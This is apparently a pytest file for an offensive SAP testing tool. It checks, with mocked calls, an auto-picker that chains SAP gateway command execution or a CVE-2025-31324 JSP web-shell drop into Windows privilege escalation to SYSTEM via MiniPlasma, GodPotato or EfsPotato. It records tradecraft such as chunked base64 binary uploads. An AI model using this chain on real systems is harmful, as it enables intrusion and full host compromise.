#!/usr/bin/env python3
"""Tests for the Windows LPE auto-picker + MiniPlasma prereq probe.

All offline; SAPXPG calls and the MiniPlasma binary blob are mocked.
"""
from __future__ import annotations

import os
from unittest.mock import patch

import pytest


# ===========================================================================
# Helpers
# ===========================================================================

def _node(os_type="Windows Server 2019", *, gw=True, cve_31324=False):
    """Build a test SAPNode for the Windows LPE flow.

    Defaults to ``gw_vulnerable=True`` so _make_exec selects the
    gateway SAPXPG path - matches how the original tests were
    structured before _make_exec existed.  Tests that want to
    exercise the CVE-2025-31324 JSP-shell path can pass
    ``cve_31324=True, gw=False``.
    """
    from sapmap_models import SAPNode
    n = SAPNode(sid="WIN", ip="10.0.0.2", hostname="winhost",
                  system_type="ABAP", os_type=os_type)
    n.gw_vulnerable = gw
    if cve_31324:
        n.cve_2025_31324_vulnerable = True
        n.cve_2025_31324_port = 50000
    return n


def _exec_gw_canned(map_in_out):
    """Build a fake execute_gw_command that pattern-matches (prog, params)
    pairs.  Match by substring on params so we don't have to know the
    exact /C flag ordering.  IMPORTANT: keys must be discriminating
    enough that they don't accidentally substring-match unrelated
    probes (e.g. "ver" appears inside "drivers"); use full distinguishing
    fragments like "/C ver" / "cldflt.sys" / "Release".
    """
    def _fake(node, prog, params, long_params=""):
        for (p, a), out in map_in_out.items():
            if prog == p and (a is None or a in params):
                return {"output": out, "success": True}
        return {"output": [], "success": True}
    return _fake


# ===========================================================================
# OS version parser
# ===========================================================================

@pytest.mark.parametrize("text,expected_build,expected_has_cldflt", [
    # Win10 22H2 — fully in scope
    ("Microsoft Windows [Version 10.0.19045.3803]", 19045, True),
    # Server 2022 — fully in scope
    ("Microsoft Windows [Version 10.0.20348.2031]", 20348, True),
    # Win10 1709 — first build with cldflt.sys (boundary)
    ("Microsoft Windows [Version 10.0.16299.1]",   16299, True),
    # Win10 1703 — one build below, no cldflt
    ("Microsoft Windows [Version 10.0.15063.2046]", 15063, False),
    # Server 2012 R2 — way too old, no cldflt
    ("Microsoft Windows [Version 6.3.9600]",        9600,  False),
    # Win11 24H2
    ("Microsoft Windows [Version 10.0.26100.1742]", 26100, True),
])
def test_parse_ver_output(text, expected_build, expected_has_cldflt):
    from sapmap_miniplasma import _parse_ver_output
    out = _parse_ver_output(text)
    assert out["build"] == expected_build
    assert out["has_cldflt"] == expected_has_cldflt


def test_parse_ver_output_returns_zeroes_on_garbage():
    from sapmap_miniplasma import _parse_ver_output
    out = _parse_ver_output("")
    assert out["build"] == 0
    assert out["has_cldflt"] is False
    out = _parse_ver_output("not-a-windows-banner")
    assert out["build"] == 0


# ===========================================================================
# .NET Release parser
# ===========================================================================

@pytest.mark.parametrize("text,expected_release,expected_version,expected_ok", [
    # 4.8 on Win10 1903+
    ("    Release    REG_DWORD    0x80ed8", 528_088, "4.8", True),
    # 4.7.2 boundary — below threshold returns satisfied=False
    ("    Release    REG_DWORD    0x70b70", 461_680, "4.7", False),  # 4.7 — below 4.7.2
    ("    Release    REG_DWORD    0x70bb0", 461_744, "4.7", False),  # 4.7 still
    ("    Release    REG_DWORD    0x70bf0", 461_808, "4.7.2", True), # 4.7.2 exact
    # 4.6.2 (Win10 1607)
    ("    Release    REG_DWORD    0x60632", 394_802, "4.6.2", False),
    # 4.8.1 (Win11 22H2)
    ("    Release    REG_DWORD    0x82348", 533_320, "4.8.1+", True),
])
def test_parse_net_release(text, expected_release, expected_version, expected_ok):
    from sapmap_miniplasma import _parse_net_release
    out = _parse_net_release(text)
    assert out["release"] == expected_release
    assert out["version"] == expected_version
    assert out["satisfied"] == expected_ok


def test_parse_net_release_empty_input_returns_zeroes():
    from sapmap_miniplasma import _parse_net_release
    out = _parse_net_release("")
    assert out["release"] == 0
    assert out["satisfied"] is False


# ===========================================================================
# certutil -encode output decoder
# ===========================================================================

def test_decode_certutil_b64_strips_pem_wrappers():
    from sapmap_miniplasma import _decode_certutil_b64
    body = (
        "-----BEGIN CERTIFICATE-----\r\n"
        "SGVsbG8gV29ybGQ=\r\n"   # "Hello World"
        "-----END CERTIFICATE-----\r\n"
    )
    assert _decode_certutil_b64(body) == b"Hello World"


def test_decode_certutil_b64_handles_multiline_b64():
    """certutil wraps base64 at 64 chars — the decoder must join lines."""
    from sapmap_miniplasma import _decode_certutil_b64
    body = (
        "-----BEGIN CERTIFICATE-----\r\n"
        "SGVsbG8gV29ybGQsIHRoaXMgaXMgYSBsb25nZXIgcGF5\r\n"
        "bG9hZCB0aGF0IHdyYXBzIGFjcm9zcyBsaW5lcw==\r\n"
        "-----END CERTIFICATE-----\r\n"
    )
    out = _decode_certutil_b64(body)
    assert out == b"Hello World, this is a longer payload that wraps across lines"


def test_decode_certutil_b64_returns_none_on_garbage():
    from sapmap_miniplasma import _decode_certutil_b64
    assert _decode_certutil_b64("") is None
    assert _decode_certutil_b64("no-begin-marker SGVsbG8=") is None


# ===========================================================================
# Base64 chunker
# ===========================================================================

def test_chunk_b64_splits_below_sapxpg_limit():
    """SAPXPG's PARAMS field silently truncates above ~255 bytes on
    many kernels.  The cmd.exe echo wrapper adds ~30 bytes, so chunks
    must stay <=100 to leave a comfortable margin (matches the
    chunk_size used by the existing CVE-2025-31324 Windows JSP
    uploader in sapmap_exploit.py, proven reliable in production).

    Larger chunks (e.g. 6000) trip the silent truncation, producing
    a corrupted assembled binary that surfaces as "Unsupported 16-Bit
    Application" or similar PE-loader failures - operator-reported
    regression that prompted the chunk-size drop."""
    from sapmap_miniplasma import _chunk_b64
    payload = b"X" * 20_000
    chunks = _chunk_b64(payload)
    assert all(len(c) <= 100 for c in chunks), (
        "every chunk must fit under SAPXPG's silent-truncation point")
    # All chunks reassembled must round-trip
    import base64
    rebuilt = base64.b64decode("".join(chunks))
    assert rebuilt == payload


def test_chunk_b64_handles_small_payload():
    from sapmap_miniplasma import _chunk_b64
    chunks = _chunk_b64(b"abc")
    assert len(chunks) == 1
    import base64
    assert base64.b64decode(chunks[0]) == b"abc"


# ===========================================================================
# MiniPlasma viability check
# ===========================================================================

def test_miniplasma_linux_short_circuits_with_reason():
    """Linux hosts must early-exit without firing SAPXPG."""
    from sapmap_miniplasma import check_miniplasma
    with patch("sapmap_exploit.execute_gw_command") as gw:
        out = check_miniplasma(_node(os_type="Linux"))
    assert out["vulnerable"] is False
    assert "Windows" in out["reason"]
    gw.assert_not_called()


def test_miniplasma_unknown_os_proceeds_to_probe():
    """When os_type is empty/unknown, the check must still attempt the
    cmd /C ver probe.  If it returns nothing, we report 'not Windows'."""
    from sapmap_miniplasma import check_miniplasma
    fake = _exec_gw_canned({("cmd.exe", "/C ver"): []})
    with patch("sapmap_exploit.execute_gw_command", side_effect=fake):
        out = check_miniplasma(_node(os_type=""))
    assert out["vulnerable"] is False
    assert "ver" in out["reason"] or "Windows" in out["reason"]


def test_miniplasma_old_windows_below_cldflt_threshold():
    """Win10 1703 (build 15063) — no cldflt.sys, must fail viability."""
    from sapmap_miniplasma import check_miniplasma
    fake = _exec_gw_canned({
        ("cmd.exe", "/C ver"): ["Microsoft Windows [Version 10.0.15063.2046]"],
    })
    with patch("sapmap_exploit.execute_gw_command", side_effect=fake):
        out = check_miniplasma(_node(os_type="Windows 10"))
    assert out["vulnerable"] is False
    assert out["has_cldflt"] is False
    assert "16299" in out["reason"]


def test_miniplasma_missing_cldflt_driver_fails():
    """Build is high enough, but operator stripped cldflt.sys from
    the image (rare hardening)."""
    from sapmap_miniplasma import check_miniplasma
    fake = _exec_gw_canned({
        ("cmd.exe", "/C ver"):    ["Microsoft Windows [Version 10.0.19045.3803]"],
        ("cmd.exe", "cldflt.sys"): ["File Not Found"],   # dir returned empty
    })
    with patch("sapmap_exploit.execute_gw_command", side_effect=fake):
        out = check_miniplasma(_node())
    assert out["vulnerable"] is False
    assert out["has_cldflt"] is False
    assert "cldflt.sys not found" in out["reason"]


def test_miniplasma_net_below_472_fails():
    """Win10 1607 ships with .NET 4.6.x — too old."""
    from sapmap_miniplasma import check_miniplasma
    fake = _exec_gw_canned({
        ("cmd.exe", "/C ver"):    ["Microsoft Windows [Version 10.0.19045.3803]"],
        ("cmd.exe", "cldflt.sys"): ["cldflt.sys"],
        ("cmd.exe", "Release"): ["    Release    REG_DWORD    0x60632"],
    })
    with patch("sapmap_exploit.execute_gw_command", side_effect=fake):
        out = check_miniplasma(_node())
    assert out["vulnerable"] is False
    assert "4.7.2" in out["reason"]


def test_miniplasma_blob_missing_makes_vulnerable_false():
    """All probes pass but blob isn't vendored → vulnerable=False with
    explicit operator-actionable reason."""
    from sapmap_miniplasma import check_miniplasma
    fake = _exec_gw_canned({
        ("cmd.exe", "/C ver"):    ["Microsoft Windows [Version 10.0.19045.3803]"],
        ("cmd.exe", "cldflt.sys"): ["cldflt.sys"],
        ("cmd.exe", "Release"): ["    Release    REG_DWORD    0x80ed8"],
    })
    with patch("sapmap_exploit.execute_gw_command", side_effect=fake), \
         patch("sapmap_miniplasma.is_blob_available", return_value=False):
        out = check_miniplasma(_node())
    assert out["vulnerable"] is False
    assert "blob isn't vendored" in out["reason"] or "build" in out["reason"]


def test_miniplasma_no_exec_primitive_short_circuits():
    """A Windows node WITHOUT gw_vulnerable AND WITHOUT
    cve_2025_31324_vulnerable cannot have MiniPlasma dispatched at
    all - operator needs to confirm one of the vulnerable paths first.
    Must return early with a clear actionable reason."""
    from sapmap_miniplasma import check_miniplasma
    n = _node(gw=False, cve_31324=False)
    with patch("sapmap_exploit.execute_gw_command") as gw, \
         patch("sapmap_exploit.execute_cve_2025_31324_via_shell") as jsp:
        out = check_miniplasma(n)
    assert out["vulnerable"] is False
    assert "exec primitive" in out["reason"] or "OS-exec" in out["reason"]
    gw.assert_not_called()
    jsp.assert_not_called()


def test_miniplasma_picks_jsp_shell_when_cve_31324_available():
    """When CVE-2025-31324 is available, exec routes through the JSP
    shell rather than gateway SAPXPG - operator-reported lab path for
    Java-on-Windows stacks where the gateway isn't vulnerable."""
    from sapmap_miniplasma import check_miniplasma
    # Java/Win node with the JSP shell path enabled and gateway disabled.
    n = _node(gw=False, cve_31324=True)
    # Pre-populate a shell so _make_exec doesn't try to auto-drop one
    # (auto-drop would hit the network in unit-test context).  In the
    # real flow auto-drop fires + succeeds before this point.
    n.cve_2025_31324_shells = [{"url": "http://10.0.0.2:50000/sap/irj/test.jsp"}]

    # Fake the JSP shell exec to return canned cmd /C ver / cldflt / .NET.
    # _exec_jsp strips the outer `cmd.exe /C ` prefix, so we see commands
    # like "ver", "dir /b ...\\cldflt.sys 2>nul", "reg query .../v Release".
    # Order matters: cldflt check first (drivers substring contains "ver").
    def _fake_jsp(node, command, timeout=20.0, auto_drop=True):
        low = command.lower().strip()
        if "cldflt.sys" in low:
            return {"output": ["cldflt.sys"], "success": True}
        if "release" in low:
            return {"output": ["    Release    REG_DWORD    0x80ed8"],
                    "success": True}
        if low == "ver":
            return {"output": ["Microsoft Windows [Version 10.0.19045.3803]"],
                    "success": True}
        return {"output": [], "success": True}
    with patch("sapmap_exploit.execute_cve_2025_31324_via_shell",
                 side_effect=_fake_jsp) as jsp_mock, \
         patch("sapmap_exploit.execute_gw_command") as gw_mock, \
         patch("sapmap_exploit.drop_cve_2025_31324_shell") as drop_mock, \
         patch("sapmap_miniplasma.is_blob_available", return_value=True):
        out = check_miniplasma(n)
    assert out["vulnerable"] is True
    assert out["details"]["exec_via"] == "jsp_shell"
    # Crucially: the gateway must NOT have been called at all
    gw_mock.assert_not_called()
    # Since shells was pre-populated, auto-drop must NOT fire
    drop_mock.assert_not_called()
    assert jsp_mock.called


def test_miniplasma_auto_drops_jsp_shell_when_none_exists():
    """When cve_2025_31324_vulnerable but no shell dropped yet,
    _make_exec must proactively auto-drop one (otherwise the blind
    Runtime.exec fallback inside execute_cve_2025_31324_via_shell
    returns empty output for every command and we'd misdiagnose the
    failure as "not Windows")."""
    from sapmap_miniplasma import check_miniplasma
    n = _node(gw=False, cve_31324=True)
    # Start with NO shells - auto-drop must fire.

    def _fake_drop(node):
        # Successful auto-drop: populate the shell list as real
        # drop_cve_2025_31324_shell would.
        node.cve_2025_31324_shells.append(
            {"url": "http://10.0.0.2:50000/sap/irj/dropped.jsp"})
        return {"success": True, "error": ""}

    def _fake_jsp(node, command, timeout=20.0, auto_drop=True):
        # Note: _exec_jsp strips the outer `cmd.exe /C ` prefix before
        # calling us, so the JSP shell sees raw commands like:
        #   "ver"
        #   "dir /b ...\\cldflt.sys 2>nul"
        #   "reg query ...\\NDP\\v4\\Full /v Release"
        # Order matters: cldflt check first (most specific) so it
        # doesn't collide with the "ver" substring (drivers has "ver").
        low = command.lower().strip()
        if "cldflt.sys" in low:
            return {"output": ["cldflt.sys"], "success": True}
        if "release" in low:
            return {"output": ["    Release    REG_DWORD    0x80ed8"],
                    "success": True}
        if low == "ver":
            return {"output": ["Microsoft Windows [Version 10.0.19045.0]"],
                    "success": True}
        return {"output": [], "success": True}

    with patch("sapmap_exploit.drop_cve_2025_31324_shell",
                 side_effect=_fake_drop) as drop_mock, \
         patch("sapmap_exploit.execute_cve_2025_31324_via_shell",
                 side_effect=_fake_jsp), \
         patch("sapmap_miniplasma.is_blob_available", return_value=True):
        out = check_miniplasma(n)
    assert out["vulnerable"] is True
    assert out["details"]["exec_via"] == "jsp_shell"
    # Auto-drop should have been invoked exactly once
    assert drop_mock.call_count == 1
    # The drop populated the shells list
    assert len(n.cve_2025_31324_shells) == 1


def test_miniplasma_jsp_drop_failure_falls_through_to_gw():
    """When auto-drop fails AND the gateway is also vulnerable,
    _make_exec must fall through to the gateway path rather than
    return None.  Belt-and-braces for hybrid-foothold targets."""
    from sapmap_miniplasma import check_miniplasma
    # Both vuln flags set; auto-drop will fail; gateway path takes over.
    n = _node(gw=True, cve_31324=True)

    def _fake_drop(node):
        return {"success": False, "error": "simulated network error"}

    fake_gw = _exec_gw_canned({
        ("cmd.exe", "/C ver"):    ["Microsoft Windows [Version 10.0.19045.0]"],
        ("cmd.exe", "cldflt.sys"): ["cldflt.sys"],
        ("cmd.exe", "Release"): ["    Release    REG_DWORD    0x80ed8"],
    })
    with patch("sapmap_exploit.drop_cve_2025_31324_shell",
                 side_effect=_fake_drop), \
         patch("sapmap_exploit.execute_cve_2025_31324_via_shell") as jsp_mock, \
         patch("sapmap_exploit.execute_gw_command", side_effect=fake_gw), \
         patch("sapmap_miniplasma.is_blob_available", return_value=True):
        out = check_miniplasma(n)
    assert out["vulnerable"] is True
    # Crucially: fell through to gateway since JSP drop failed
    assert out["details"]["exec_via"] == "gw_sapxpg"
    # JSP shell exec must NEVER have been called (drop failed first)
    jsp_mock.assert_not_called()


def test_miniplasma_full_viability_with_blob():
    """Everything green: Win10 22H2, cldflt present, .NET 4.8, blob vendored."""
    from sapmap_miniplasma import check_miniplasma
    fake = _exec_gw_canned({
        ("cmd.exe", "/C ver"):    ["Microsoft Windows [Version 10.0.19045.3803]"],
        ("cmd.exe", "cldflt.sys"): ["cldflt.sys"],
        ("cmd.exe", "Release"): ["    Release    REG_DWORD    0x80ed8"],
    })
    with patch("sapmap_exploit.execute_gw_command", side_effect=fake), \
         patch("sapmap_miniplasma.is_blob_available", return_value=True):
        out = check_miniplasma(_node())
    assert out["vulnerable"] is True
    assert out["has_cldflt"] is True
    assert out["net_version"] == "4.8"
    assert out["os_build"] == "10.0.19045"


# ===========================================================================
# Auto-picker
# ===========================================================================

def test_auto_picker_selects_miniplasma_when_viable():
    """Currently the only Windows LPE technique — picker picks it
    whenever miniplasma.check_miniplasma reports vulnerable."""
    from sapmap_winlpe_auto import check_windows_lpe
    n = _node()
    with patch("sapmap_miniplasma.check_miniplasma", return_value={
            "vulnerable": True, "os_build": "10.0.19045",
            "has_cldflt": True, "net_version": "4.8",
            "blob_available": True, "reason": "OK", "details": {}}):
        out = check_windows_lpe(n)
    assert out["method"] == "miniplasma"
    assert n.miniplasma_vulnerable is True
    assert n.windows_lpe_method == "miniplasma"
    assert "MiniPlasma viable" in out["summary"]


def test_auto_picker_returns_none_when_miniplasma_not_viable():
    from sapmap_winlpe_auto import check_windows_lpe
    n = _node()
    with patch("sapmap_miniplasma.check_miniplasma", return_value={
            "vulnerable": False, "os_build": "6.3.9600",
            "has_cldflt": False, "net_version": "",
            "blob_available": True,
            "reason": "OS build too old", "details": {}}):
        out = check_windows_lpe(n)
    assert out["method"] is None
    assert n.miniplasma_vulnerable is False
    assert n.windows_lpe_method == ""
    assert "No working Windows LPE" in out["summary"]


def test_force_env_overrides_auto():
    """SAPMAP_WINLPE_FORCE=miniplasma forces selection even when the
    viability check says no (operator override for staging tests)."""
    from sapmap_winlpe_auto import check_windows_lpe
    n = _node()
    with patch.dict(os.environ, {"SAPMAP_WINLPE_FORCE": "miniplasma"}), \
         patch("sapmap_miniplasma.check_miniplasma", return_value={
            "vulnerable": False, "os_build": "10.0.15063",
            "has_cldflt": False, "net_version": "4.6.2",
            "blob_available": True,
            "reason": "OS too old", "details": {}}):
        out = check_windows_lpe(n)
    assert out["method"] == "miniplasma"   # forced


def test_run_windows_lpe_dispatches_to_picked_method():
    """run_windows_lpe must invoke sapmap_miniplasma.run_as_system when
    the picker says miniplasma, propagate its result, and set
    miniplasma_system_obtained on success."""
    from sapmap_winlpe_auto import run_windows_lpe
    n = _node()
    with patch("sapmap_miniplasma.check_miniplasma", return_value={
            "vulnerable": True, "os_build": "10.0.19045",
            "has_cldflt": True, "net_version": "4.8",
            "blob_available": True, "reason": "OK", "details": {}}), \
         patch("sapmap_miniplasma.run_as_system", return_value={
            "ok": True, "stdout": "nt authority\\system", "error": ""}):
        out = run_windows_lpe(n, "whoami")
    assert out["ok"] is True
    assert out["method"] == "miniplasma"
    assert out["stdout"] == "nt authority\\system"
    assert n.miniplasma_system_obtained is True


def test_run_windows_lpe_no_method_returns_clean_error():
    """When no technique is viable, run_windows_lpe must NOT call any
    exploit module, just return a structured error from the picker."""
    from sapmap_winlpe_auto import run_windows_lpe
    n = _node()
    with patch("sapmap_miniplasma.check_miniplasma", return_value={
            "vulnerable": False, "os_build": "", "has_cldflt": False,
            "net_version": "", "blob_available": False,
            "reason": "Linux host", "details": {}}), \
         patch("sapmap_miniplasma.run_as_system") as mp_run:
        out = run_windows_lpe(n, "whoami")
    assert out["ok"] is False
    assert out["method"] == ""
    assert "No working Windows LPE" in out["error"]
    mp_run.assert_not_called()


# ===========================================================================
# GodPotato — SeImpersonate -> SYSTEM via DCOM unmarshal
# ===========================================================================

def test_has_se_impersonate_parses_whoami_priv_output():
    """`whoami /priv` lists SeImpersonatePrivilege when held.  Parser
    must match it regardless of Enabled/Disabled state column value
    (GodPotato can flip Disabled -> Enabled via AdjustTokenPrivileges
    at runtime, so presence in the token is what matters)."""
    from sapmap_godpotato import _has_se_impersonate
    held_enabled = (
        "PRIVILEGES INFORMATION\n"
        "----------------------\n"
        "\n"
        "Privilege Name                  Description                State\n"
        "==============================  ========================== ========\n"
        "SeAssignPrimaryTokenPrivilege   Replace a process level... Disabled\n"
        "SeImpersonatePrivilege          Impersonate a client...    Enabled\n"
        "SeCreateGlobalPrivilege         Create global objects      Enabled\n"
    )
    held_disabled = held_enabled.replace("Enabled\n", "Disabled\n", 2)
    not_held = (
        "PRIVILEGES INFORMATION\n"
        "Privilege Name                  Description                State\n"
        "SeShutdownPrivilege             Shut down the system       Disabled\n"
    )
    assert _has_se_impersonate(held_enabled) is True
    assert _has_se_impersonate(held_disabled) is True
    assert _has_se_impersonate(not_held) is False
    assert _has_se_impersonate("") is False


def test_godpotato_linux_short_circuits_with_reason():
    """Linux hosts must early-exit without firing SAPXPG."""
    from sapmap_godpotato import check_godpotato
    with patch("sapmap_exploit.execute_gw_command") as gw:
        out = check_godpotato(_node(os_type="Linux"))
    assert out["vulnerable"] is False
    assert "Windows" in out["reason"]
    gw.assert_not_called()


def test_godpotato_no_exec_primitive_short_circuits():
    """No GW vuln AND no CVE-2025-31324 vuln -> can't dispatch
    anything; bail cleanly with operator-actionable error."""
    from sapmap_godpotato import check_godpotato
    n = _node(gw=False, cve_31324=False)
    with patch("sapmap_exploit.execute_gw_command") as gw, \
         patch("sapmap_exploit.execute_cve_2025_31324_via_shell") as jsp:
        out = check_godpotato(n)
    assert out["vulnerable"] is False
    assert "OS-exec primitive" in out["reason"] or "exec primitive" in out["reason"]
    gw.assert_not_called()
    jsp.assert_not_called()


def test_godpotato_no_se_impersonate_fails():
    """Even if OS is Windows + blob vendored, missing
    SeImpersonatePrivilege makes the exploit unviable."""
    from sapmap_godpotato import check_godpotato
    fake = _exec_gw_canned({
        ("cmd.exe", "/C ver"):      ["Microsoft Windows [Version 10.0.14393]"],
        ("cmd.exe", "whoami /priv"): [
            "PRIVILEGES INFORMATION",
            "Privilege Name                  Description     State",
            "==============================  =============== ========",
            "SeShutdownPrivilege             Shut down...    Disabled",
        ],
    })
    with patch("sapmap_exploit.execute_gw_command", side_effect=fake), \
         patch("sapmap_godpotato.is_blob_available", return_value=True):
        out = check_godpotato(_node())
    assert out["vulnerable"] is False
    assert out["has_impersonate"] is False
    assert "SeImpersonatePrivilege" in out["reason"]


def test_godpotato_full_viability_with_se_impersonate_and_blob():
    """All green: Windows + SeImpersonate held + .NET 4.7.2+ + blob vendored."""
    from sapmap_godpotato import check_godpotato
    fake = _exec_gw_canned({
        ("cmd.exe", "/C ver"):      ["Microsoft Windows [Version 10.0.14393]"],
        ("cmd.exe", "whoami /priv"): [
            "PRIVILEGES INFORMATION",
            "SeImpersonatePrivilege          Impersonate a client...    Enabled",
        ],
        ("cmd.exe", "Release"): ["    Release    REG_DWORD    0x80ed8"],  # 4.8
    })
    with patch("sapmap_exploit.execute_gw_command", side_effect=fake), \
         patch("sapmap_godpotato.is_blob_available", return_value=True):
        out = check_godpotato(_node())
    assert out["vulnerable"] is True
    assert out["has_impersonate"] is True
    assert out["os_build"] == "10.0.14393"   # Server 2016 = below MiniPlasma's cldflt threshold


def test_godpotato_old_dotnet_fails():
    """Server 2016 RTM has .NET 4.6.2 (Release 394802).  GodPotato is
    built against 4.7.2 (Release 461808) so an unpatched RTM box would
    fail to CLR-load gp_bin.exe.  Catch it in the viability check
    instead of mid-exploit."""
    from sapmap_godpotato import check_godpotato
    fake = _exec_gw_canned({
        ("cmd.exe", "/C ver"):      ["Microsoft Windows [Version 10.0.14393]"],
        ("cmd.exe", "whoami /priv"): [
            "PRIVILEGES INFORMATION",
            "SeImpersonatePrivilege          Impersonate a client...    Enabled",
        ],
        ("cmd.exe", "Release"): ["    Release    REG_DWORD    0x60632"],  # 4.6.2
    })
    with patch("sapmap_exploit.execute_gw_command", side_effect=fake), \
         patch("sapmap_godpotato.is_blob_available", return_value=True):
        out = check_godpotato(_node())
    assert out["vulnerable"] is False
    assert "4.7.2" in out["reason"]


def test_godpotato_works_on_server_2016_where_miniplasma_fails():
    """The whole point of GodPotato in SAPMAP: cover the gap below
    MiniPlasma's cldflt.sys threshold (Win10 1709+ / Server 2019+).
    On Server 2016 (build 14393), MiniPlasma fails but GodPotato
    works - the picker MUST select GodPotato."""
    from sapmap_winlpe_auto import check_windows_lpe
    # Stub miniplasma to "not vulnerable" (Server 2016 below cldflt)
    # and godpotato to "vulnerable".
    with patch("sapmap_miniplasma.check_miniplasma", return_value={
            "vulnerable": False, "os_build": "10.0.14393",
            "has_cldflt": False, "net_version": "4.6.2",
            "blob_available": True,
            "reason": "OS build 10.0.14393 < 16299",
            "details": {}}), \
         patch("sapmap_godpotato.check_godpotato", return_value={
            "vulnerable": True, "os_build": "10.0.14393",
            "has_impersonate": True, "blob_available": True,
            "reason": "Windows 10.0.14393 with SeImpersonate held",
            "details": {}}):
        out = check_windows_lpe(_node(os_type="Windows Server 2016"))
    assert out["method"] == "godpotato"
    assert "GodPotato viable" in out["summary"]


def test_picker_prefers_godpotato_when_both_viable():
    """Both techniques viable -> picker chooses GodPotato (deterministic,
    no race) over MiniPlasma."""
    from sapmap_winlpe_auto import check_windows_lpe
    with patch("sapmap_miniplasma.check_miniplasma", return_value={
            "vulnerable": True, "os_build": "10.0.19045",
            "has_cldflt": True, "net_version": "4.8",
            "blob_available": True, "reason": "OK", "details": {}}), \
         patch("sapmap_godpotato.check_godpotato", return_value={
            "vulnerable": True, "os_build": "10.0.19045",
            "has_impersonate": True, "blob_available": True,
            "reason": "OK", "details": {}}):
        out = check_windows_lpe(_node())
    assert out["method"] == "godpotato"


def test_picker_falls_back_to_miniplasma_when_no_se_impersonate():
    """SAP service account stripped of SeImpersonate (rare but possible
    on hardened images) -> GodPotato fails, MiniPlasma takes over."""
    from sapmap_winlpe_auto import check_windows_lpe
    with patch("sapmap_godpotato.check_godpotato", return_value={
            "vulnerable": False, "os_build": "10.0.19045",
            "has_impersonate": False, "blob_available": True,
            "reason": "SeImpersonatePrivilege NOT held",
            "details": {}}), \
         patch("sapmap_miniplasma.check_miniplasma", return_value={
            "vulnerable": True, "os_build": "10.0.19045",
            "has_cldflt": True, "net_version": "4.8",
            "blob_available": True, "reason": "OK", "details": {}}):
        out = check_windows_lpe(_node())
    assert out["method"] == "miniplasma"


def test_run_windows_lpe_dispatches_to_godpotato():
    """run_windows_lpe must invoke sapmap_godpotato.run_as_system
    when the picker selects godpotato + set godpotato_system_obtained
    on success."""
    from sapmap_winlpe_auto import run_windows_lpe
    n = _node()
    with patch("sapmap_godpotato.check_godpotato", return_value={
            "vulnerable": True, "os_build": "10.0.14393",
            "has_impersonate": True, "blob_available": True,
            "reason": "OK", "details": {}}), \
         patch("sapmap_miniplasma.check_miniplasma", return_value={
            "vulnerable": False, "os_build": "10.0.14393",
            "has_cldflt": False, "net_version": "",
            "blob_available": True, "reason": "no cldflt",
            "details": {}}), \
         patch("sapmap_godpotato.run_as_system", return_value={
            "ok": True, "stdout": "nt authority\\system", "error": ""}):
        out = run_windows_lpe(n, "whoami")
    assert out["ok"] is True
    assert out["method"] == "godpotato"
    assert out["stdout"] == "nt authority\\system"
    assert n.godpotato_system_obtained is True


def test_force_env_godpotato_overrides_picker():
    """SAPMAP_WINLPE_FORCE=godpotato forces selection even when the
    viability check says no - operator override for staging tests."""
    from sapmap_winlpe_auto import check_windows_lpe
    with patch.dict(os.environ, {"SAPMAP_WINLPE_FORCE": "godpotato"}), \
         patch("sapmap_efspotato.check_efspotato", return_value={
            "vulnerable": False, "os_build": "10.0.7600",
            "has_impersonate": False, "blob_available": True,
            "reason": "x", "details": {}}), \
         patch("sapmap_godpotato.check_godpotato", return_value={
            "vulnerable": False, "os_build": "10.0.7600",
            "has_impersonate": False, "blob_available": True,
            "reason": "too old", "details": {}}), \
         patch("sapmap_miniplasma.check_miniplasma", return_value={
            "vulnerable": True, "os_build": "10.0.7600",
            "has_cldflt": False, "net_version": "",
            "blob_available": True, "reason": "x", "details": {}}):
        out = check_windows_lpe(_node())
    assert out["method"] == "godpotato"


# ===========================================================================
# EfsPotato — MS-EFSRPC -> SYSTEM via lsass coercion
# ===========================================================================

def test_efspotato_linux_short_circuits_with_reason():
    """Linux hosts must early-exit without firing SAPXPG."""
    from sapmap_efspotato import check_efspotato
    with patch("sapmap_exploit.execute_gw_command") as gw:
        out = check_efspotato(_node(os_type="Linux"))
    assert out["vulnerable"] is False
    assert "Windows" in out["reason"]
    gw.assert_not_called()


def test_efspotato_no_exec_primitive_short_circuits():
    from sapmap_efspotato import check_efspotato
    n = _node(gw=False, cve_31324=False)
    with patch("sapmap_exploit.execute_gw_command") as gw, \
         patch("sapmap_exploit.execute_cve_2025_31324_via_shell") as jsp:
        out = check_efspotato(n)
    assert out["vulnerable"] is False
    assert "exec primitive" in out["reason"] or "OS-exec" in out["reason"]
    gw.assert_not_called()
    jsp.assert_not_called()


def test_efspotato_no_se_impersonate_fails():
    """Missing SeImpersonatePrivilege blocks the whole MS-EFSR chain."""
    from sapmap_efspotato import check_efspotato
    fake = _exec_gw_canned({
        ("cmd.exe", "/C ver"):       ["Microsoft Windows [Version 10.0.14393]"],
        ("cmd.exe", "whoami /priv"): [
            "PRIVILEGES INFORMATION",
            "SeShutdownPrivilege             Shut down...    Disabled",
        ],
    })
    with patch("sapmap_exploit.execute_gw_command", side_effect=fake), \
         patch("sapmap_efspotato.is_blob_available", return_value=True):
        out = check_efspotato(_node())
    assert out["vulnerable"] is False
    assert out["has_impersonate"] is False
    assert "SeImpersonatePrivilege" in out["reason"]


def test_efspotato_full_viability_with_blob():
    """Server 2016 + SeImpersonate held + .NET 4.8 + blob -> EfsPotato
    viable.  This is the exact configuration of the SJJ lab regression
    that motivated EfsPotato integration."""
    from sapmap_efspotato import check_efspotato
    fake = _exec_gw_canned({
        ("cmd.exe", "/C ver"):       ["Microsoft Windows [Version 10.0.14393]"],
        ("cmd.exe", "whoami /priv"): [
            "PRIVILEGES INFORMATION",
            "SeImpersonatePrivilege          Impersonate a client...    Enabled",
        ],
        ("cmd.exe", "Release"): ["    Release    REG_DWORD    0x80ed8"],
    })
    with patch("sapmap_exploit.execute_gw_command", side_effect=fake), \
         patch("sapmap_efspotato.is_blob_available", return_value=True):
        out = check_efspotato(_node())
    assert out["vulnerable"] is True
    assert out["has_impersonate"] is True
    assert out["os_build"] == "10.0.14393"


def test_efspotato_old_dotnet_fails():
    """Same .NET 4.7.2 threshold as GodPotato (same TFM)."""
    from sapmap_efspotato import check_efspotato
    fake = _exec_gw_canned({
        ("cmd.exe", "/C ver"):       ["Microsoft Windows [Version 10.0.14393]"],
        ("cmd.exe", "whoami /priv"): [
            "PRIVILEGES INFORMATION",
            "SeImpersonatePrivilege          Impersonate a client...    Enabled",
        ],
        ("cmd.exe", "Release"): ["    Release    REG_DWORD    0x60632"],  # 4.6.2
    })
    with patch("sapmap_exploit.execute_gw_command", side_effect=fake), \
         patch("sapmap_efspotato.is_blob_available", return_value=True):
        out = check_efspotato(_node())
